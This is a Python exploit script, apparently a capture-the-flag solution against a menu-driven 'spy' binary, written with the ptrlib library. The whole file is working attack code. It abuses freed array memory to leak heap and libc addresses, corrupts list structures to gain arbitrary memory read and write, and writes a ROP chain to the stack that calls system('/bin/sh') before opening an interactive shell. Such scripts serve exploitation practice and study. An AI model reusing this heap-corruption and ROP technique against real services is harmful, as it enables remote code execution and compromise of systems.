from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9001"))

def add(name):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", name)
    return int(sock.recvlineafter("ID: "))
def update(id, name):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("ID: ", str(id))
    sock.sendlineafter("New name: ", name)
def show():
    res = []
    sock.sendlineafter("> ", "3")
    while True:
        if sock.recvonce(1) != b'-':
            sock.unget(b'>')
            break
        id = int(sock.recvlineafter("ID: "))
        name = sock.recvlineafter("Name: ")
        res.append((id, name))
    return res
def mark(id):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("ID of suspect: ", str(id))
def update_spy_id(id):
    sock.sendlineafter("> ", "5")
    sock.sendlineafter("New ID: ", str(id))
def show_spy():
    sock.sendlineafter("> ", "6")
    id = int(sock.recvlineafter("ID: "))
    name = sock.recvlineafter("Name: ")
    return (id, name)

#libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
#sock = Process("../distfiles/spy")
libc = ELF("./libc.so.6")
sock = Socket(HOST, PORT)

# Make big array: v1 = [a, id, ..., id, hole, hole]
a = add(b"AAAA")
for i in range(23):
    add(b"watevr_smal")
mark(a) # mark pointer to 'a'

# Free v1 and allocate new chunk for array
# v1 = [free_link, id, ..., id, id, hole, hole, ..., hole]
add(b"watevr_smal")

# Leak pointer set by GC
heap_base = show_spy()[0] - 0x20dd0
logger.info(f"heap base: 0x{heap_base:x}")
libc.base = heap_base + 0x113000

# Calculate some more addresses
addr_nameList = heap_base + 0x8e80
addr_idList = heap_base + 0x8ea0
addr_nameList_buf = heap_base + 0x23e00
addr_idList_buf = heap_base + 0x22e00
logger.info(f"nameList: 0x{addr_nameList:x}")
logger.info(f"idList: 0x{addr_idList:x}")
logger.info(f"nameList.@buffer: 0x{addr_nameList_buf:x}")
logger.info(f"idList.@buffer: 0x{addr_idList_buf:x}")
stat = show()

# Overwrite free list pointer
update_spy_id(addr_nameList - 0x50)

# Overwrite name_list and id_list
payload  = b"A"*0x4
payload += flat([ # fiber and so on
    0x000000000000008f, 0x0000000400000001,
    heap_base + 0xded0, 0,
    0x000000020000008f, 0x0000000400000000, # lock or smth???
    heap_base + 0xdf00, 0,
], map=p64)
# name_list
payload += p32(0x04) + p32(0x1)   # type / size
payload += p64(0xffff)            # capacity
payload += p64(addr_nameList_buf) # buffer
payload += p64(0)
# id_list
payload += p32(0x1c) + p32(0x1)    # type / size
payload += p64(0xffff)             # capacity
payload += p64(addr_idList + 0x10) # buffer --> pointerof(idList.@buffer)
payload += p64(0)
# save heap state
payload += flat([
    0x8f, 0, 0, 0,
    0x000000010000008b, 0x0000000400000000,
    heap_base + 0xdf30,
], map=p64)
payload += b'\x00' * (0xc0 - len(payload))
if not is_fgets_safe(payload):
    logger.error("Bad luck!")
    exit(1)
assert len(payload) == 0xc0, f"Invalid size: {hex(len(payload))}"
add(payload) # dummy
add(payload) # boom!

# Record pointer to idList.@buffer
mark(addr_idList + 0x10)

# AAR to leak everything
def AAR(address):
    update_spy_id(address)
    return show()[0][0]

# AAW to overwrite memory (callable only once)
def AAW_once(address, values):
    update_spy_id(address - 0x10) # 0x10: already 2 elements exist
    for value in values:
        id = add(b"A")
        mark(id)
        update_spy_id(value)

addr_stack = AAR(libc.symbol('environ')) - 0x120
logger.info(f"return address: 0x{addr_stack:x}")

# Inject ROP chain
AAW_once(addr_stack, [
    next(libc.gadget("ret;")),
    next(libc.gadget("pop rdi; ret;")),
    next(libc.search("/bin/sh")),
    libc.symbol("system"),
])

# Win!
sock.sendlineafter("> ", "0")

sock.sh()
